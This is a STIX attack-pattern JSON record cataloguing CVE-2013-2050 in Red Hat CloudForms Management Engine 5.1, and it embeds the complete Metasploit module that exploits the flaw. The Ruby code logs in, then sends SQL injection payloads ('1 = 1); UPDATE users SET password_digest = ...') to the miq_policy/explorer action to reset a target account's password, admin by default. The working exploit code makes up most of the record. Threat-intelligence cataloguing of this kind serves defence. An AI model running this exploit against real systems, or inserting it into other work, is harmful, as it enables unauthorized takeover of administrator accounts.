{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2b431546-8d00-4342-b96e-291c116197e7",
    "created": "2024-08-14T16:23:58.698582Z",
    "modified": "2024-08-14T16:23:58.698586Z",
    "name": "Red Hat CloudForms Management Engine 5.1 miq_policy/explorer SQL Injection",
    "description": " This module exploits a SQL injection vulnerability in the \"explorer\" action of \"miq_policy\" controller of the Red Hat CloudForms Management Engine 5.1 (ManageIQ Enterprise Virtualization Manager 5.0 and earlier) by changing the password of the target account to the specified password. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/cfme_manageiq_evm_pass_reset.rb",
            "external_id": "cfme_manageiq_evm_pass_reset.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2050"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=959062"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'bcrypt'\nrequire 'digest'\nrequire 'openssl'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize\n    super(\n      'Name' => 'Red Hat CloudForms Management Engine 5.1 miq_policy/explorer SQL Injection',\n      'Description' => %q{\n          This module exploits a SQL injection vulnerability in the \"explorer\"\n        action of \"miq_policy\" controller of the Red Hat CloudForms Management\n        Engine 5.1 (ManageIQ Enterprise Virtualization Manager 5.0 and earlier) by\n        changing the password of the target account to the specified password.\n      },\n      'Author' => 'Ramon de C Valle',\n      'License' => MSF_LICENSE,\n      'References' => [\n        ['CVE', '2013-2050'],\n        ['CWE', '89'],\n        ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=959062']\n      ],\n      'DefaultOptions' => {\n        'SSL' => true\n      },\n      'DisclosureDate' => 'Nov 12 2013'\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('USERNAME', [true, 'Your username']),\n        OptString.new('PASSWORD', [true, 'Your password']),\n        OptString.new('TARGETUSERNAME', [true, 'The username of the target account', 'admin']),\n        OptString.new('TARGETPASSWORD', [true, 'The password of the target account', 'smartvm']),\n        OptString.new('TARGETURI', [ true, 'The path to the application', '/']),\n        OptEnum.new('HTTP_METHOD', [true, 'HTTP Method', 'POST', ['GET', 'POST'] ])\n      ], self.class\n    )\n  end\n\n  def password_for_newer_schema\n    # Newer versions use ActiveModel's SecurePassword.\n    BCrypt::Password.create(datastore['TARGETPASSWORD'])\n  end\n\n  def password_for_older_schema\n    # Older versions use ManageIQ's MiqPassword.\n    if datastore['TARGETPASSWORD'].empty?\n      'v1:{}'\n    else\n      password = '1234567890123456'\n      salt = '6543210987654321'\n      cipher = OpenSSL::Cipher.new('AES-256-CBC')\n      cipher.encrypt\n      cipher.key = Digest::SHA256.digest(\"#{salt}#{password}\")[0...32]\n      encrypted = cipher.update(datastore['TARGETPASSWORD']) + cipher.final\n      \"v1:{#{Rex::Text.encode_base64(encrypted)}}\"\n    end\n  end\n\n  def password_reset?\n    print_status(\"Trying to log into #{target_url('dashboard')} using the target account...\")\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'dashboard', 'authenticate'),\n      'vars_post' => {\n        'user_name' => datastore['TARGETUSERNAME'],\n        'user_password' => datastore['TARGETPASSWORD']\n      }\n    )\n\n    if res.nil?\n      print_error('No response from remote host')\n      return false\n    end\n\n    if res.body =~ /\"Error: (.*)\"/\n      print_error(::Regexp.last_match(1))\n      false\n    else\n      true\n    end\n  end\n\n  def run\n    print_status(\"Logging into #{target_url('dashboard')}...\")\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'dashboard', 'authenticate'),\n      'vars_post' => {\n        'user_name' => datastore['USERNAME'],\n        'user_password' => datastore['PASSWORD']\n      }\n    )\n\n    if res.nil?\n      print_error('No response from remote host')\n      return\n    end\n\n    if res.body =~ /\"Error: (.*)\"/\n      print_error(::Regexp.last_match(1))\n      return\n    else\n      session = ::Regexp.last_match(1) if res.get_cookies =~ /_vmdb_session=(\\h*)/\n\n      if session.nil?\n        print_error('Failed to retrieve the current session id')\n        return\n      end\n    end\n\n    # Newer versions don't accept POST requests.\n    print_status(\"Sending password-reset request to #{target_url('miq_policy', 'explorer')}...\")\n    send_request_cgi(\n      'cookie' => \"_vmdb_session=#{session}\",\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'miq_policy', 'explorer'),\n      'vars_get' => {\n        'profile[]' => value_for_newer_schema\n      }\n    )\n\n    if password_reset?\n      print_good('Password reset successfully')\n      return\n    else\n      print_error('Failed to reset password')\n    end\n\n    print_status(\"Sending (older-schema) password-reset request to #{target_url('miq_policy', 'explorer')}...\")\n    send_request_cgi(\n      'cookie' => \"_vmdb_session=#{session}\",\n      'method' => datastore['HTTP_METHOD'],\n      'uri' => normalize_uri(target_uri.path, 'miq_policy', 'explorer'),\n      \"vars_#{datastore['HTTP_METHOD'].downcase}\" => {\n        'profile[]' => value_for_older_schema\n      }\n    )\n\n    if password_reset?\n      print_good('Password reset successfully')\n    else\n      print_error('Failed to reset password')\n    end\n  end\n\n  def target_url(*args)\n    (ssl ? 'https' : 'http') +\n      if rport.to_i == 80 || rport.to_i == 443\n        \"://#{vhost}\"\n      else\n        \"://#{vhost}:#{rport}\"\n      end + normalize_uri(target_uri.path, *args)\n  end\n\n  def value_for_newer_schema\n    \"1 = 1); UPDATE users SET password_digest = '#{password_for_newer_schema}' WHERE userid = '#{datastore['TARGETUSERNAME']}' --\"\n  end\n\n  def value_for_older_schema\n    \"1 = 1); UPDATE users SET password = '#{password_for_older_schema}' WHERE userid = '#{datastore['TARGETUSERNAME']}' --\"\n  end\nend\n",
    "x_mitre_disclosure_date": "Nov 12 2013"
}